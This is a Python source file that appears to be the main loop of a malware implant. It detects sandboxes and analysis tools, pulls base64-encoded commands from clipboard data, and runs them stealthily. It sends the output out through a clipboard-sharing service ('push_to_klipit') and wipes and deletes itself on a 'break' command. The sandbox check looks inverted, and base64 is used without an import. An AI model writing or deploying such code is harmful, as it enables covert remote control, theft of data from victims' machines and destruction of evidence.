import re
import os
import psutil
import time
from transporter import *
from wiper import *
from executor import *
import time
from random import randint


def extract_commands(text):
    commands = re.findall(r'"(.*?)"', text)

    for i in range(len(commands)):
        cmd = commands[i]
        decoded = base64.b64decode(cmd.encode()).decode()
        commands[i] = decoded

    return commands


def sandbox_check(verbose=False):
    suspicious = []

    try:
        with open("/proc/uptime") as f:
            uptime = float(f.readline().split()[0])
            if uptime < 300:
                suspicious.append("Low uptime")
    except:
        pass

    try:
        if os.cpu_count() <= 2:
            suspicious.append("Low CPU core count")
    except:
        pass

    try:
        if len(os.listdir("/proc")) < 50:
            suspicious.append("Low process count")
    except:
        pass

    try:
        sandbox_tools = ["vbox", "vmware", "xen", "wireshark", "procmon", "sandbox", "fakenet", "ida", "olly"]
        for proc in psutil.process_iter(['name']):
            name = proc.info['name'].lower()
            if any(tool in name for tool in sandbox_tools):
                suspicious.append(f"Suspicious process: {name}")
                break
    except:
        pass

    try:
        start = time.time()
        time.sleep(5)
        if time.time() - start < 4.5:
            suspicious.append("Sleep skipped")
    except:
        pass

    if verbose:
        for reason in suspicious:
            # print(f"[!] Sandbox suspicion: {reason}")
            pass

    return len(suspicious) > 0


def main():
    done_cmd = ""

    while True:
        if sandbox_check(verbose=False):
            clipboard_data = fetch_clipboard_data()
            print("Clipboard data: ", clipboard_data)
            commands = extract_commands(clipboard_data)
            print(commands)

            for command in commands:
                if command == done_cmd:
                    continue

                if command == "break":
                    secure_erase_and_delete_self()

                print(command)
                output = run_command_stealth(command)
                push_to_klipit(output)
                time.sleep(randint(3, 10))

                done_cmd = command


if __name__ == '__main__':
    main()
